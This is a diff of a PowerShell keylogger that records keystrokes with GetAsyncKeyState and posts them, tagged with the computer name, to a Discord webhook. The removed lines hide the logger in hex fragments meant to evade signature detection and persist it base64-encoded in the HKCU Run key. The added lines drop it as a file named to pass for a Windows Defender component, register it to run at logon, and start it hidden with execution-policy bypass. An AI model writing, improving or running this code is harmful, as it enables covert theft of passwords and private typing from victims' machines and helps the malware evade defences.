@@ -1,28 +1,47 @@
-# Configuration
-$W = "https://discord.com/api/webhooks/1348482615879139408/8WWmsASLCd2mVWVyInAUh0I_RprgBGRdWG1cDLWLptSvFtHwyJMetbIHQ_VfPdayeu_0"
-$K = "WinUpdateSvc"
+# Configuration - YOU MUST REPLACE THIS WITH YOUR NEW URL
+$W = "https://discord.com/api/webhooks/1504038539984113755/-YlOeox0lAsJLUETBjQImcHlD7PzbLacAjOetUX3pNDhkDBGkGZn4oGM-vGmnl_5LMHX"
+$P = "WinDefenderSync"
+$F = "$env:LOCALAPPDATA\win_sync.ps1"
 
-# Fragmented Hex to avoid signature detection
-$h1 = "4164642d54797065202d5479706520277573696e672053797374656d3b7573696e672053797374656d2e52756e74696d652e496e7465726f7053657276696365733b7075626c696320636c617373204b7b5b446c6c496d706f727428227573657233322e646c6c22295d7075626c6963207374617469632065787465726e2073686f7274204765744173796e634b6579537461746528696e742076293b7d273b"
-$h2 = "244c3d27273b7768696c652831297b53746172742d536c656570202d6d2035303b666f722824693d383b2469202d6c65203139303b24692b2b297b6966285b4b5d3a3a4765744173796e634b6579537461746528246929202d6571202d3332373637297b244c2b3d5b636861725d24693b696628244c2e4c656e677468202d6765203235297b24703d407b757365726e616d653d24656e763a434f4d50555445524e414d453b636f6e74656e743d244c7d7c436f6e76657274546f2d4a736f6e3b496e766f6b652d526573744d6574686f64202d5572692027"
-$h3 = "27202d4d6574686f6420506f7374202d426f6479202470202d436f6e74656e745479706520276170706c69636174696f6e2f6a736f6e273b244c3d27277d7d7d7d"
+# 1. The Core Logic (Updated for resilience and character escaping)
+$C = @"
+`$W = '$W'; `$N = `$env:COMPUTERNAME; `$L = ''
+Add-Type -Type 'using System;using System.Runtime.InteropServices;public class K{[DllImport("user32.dll")]public static extern short GetAsyncKeyState(int v);]}'
+while(`$true){
+    Start-Sleep -m 40
+    for(`$i=8;`$i -le 190;`$i++){
+        if([K]::GetAsyncKeyState(`$i) -eq -32767){
+            `$k = [char]`$i
+            # Basic sanitization for JSON safety
+            if (`$k -eq '"') { `$k = "'" }
+            if (`$k -eq '\') { `$k = "/" }
+            `$L += `$k
+            
+            if (`$L.Length -ge 25) {
+                `$Payload = @{
+                    username = "GHOST_`$N"
+                    content  = "[$N]: `$L"
+                } | ConvertTo-Json
+                
+                try {
+                    Invoke-RestMethod -Uri `$W -Method Post -Body `$Payload -ContentType "application/json"
+                    `$L = ''
+                } catch {
+                    # If webhook is 404/Unknown, don't crash, just wait
+                    Start-Sleep -s 10
+                }
+            }
+        }
+    }
+}
+"@
 
-# Fixed Reassembly: Avoid piping directly into -join
-$WebhookHex = ($W.ToCharArray() | ForEach-Object { [System.Convert]::ToString([int]$_, 16) }) -join ""
-$FullHex = $h1 + $h2 + $WebhookHex + $h3
-
-# Convert Hex to String safely
-$Core = ""
-for ($i = 0; $i -lt $FullHex.Length; $i += 2) {
-    $Core += [char][System.Convert]::ToInt32($FullHex.Substring($i, 2), 16)
+# 2. Drop and Persist
+if (-not (Test-Path $F)) {
+    $C | Out-File -FilePath $F -Encoding ascii -Force
+    $RegPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+    New-ItemProperty -Path $RegPath -Name $P -Value "powershell.exe -W H -Exec Bypass -File `"$F`"" -PropertyType String -Force
 }
 
-# Persistence: Encode to Base64 to stay invisible on disk
-$B64 = [Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($Core))
-$RegValue = "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command `"[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('$B64')) | iex`""
-
-$RegPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
-Set-ItemProperty -Path $RegPath -Name $K -Value $RegValue -Force
-
-# Execute immediately in current session
-Invoke-Expression $Core
+# 3. Execution
+Start-Process powershell.exe -ArgumentList "-W H -NoP -Exec Bypass -File `"$F`"" -WindowStyle Hidden
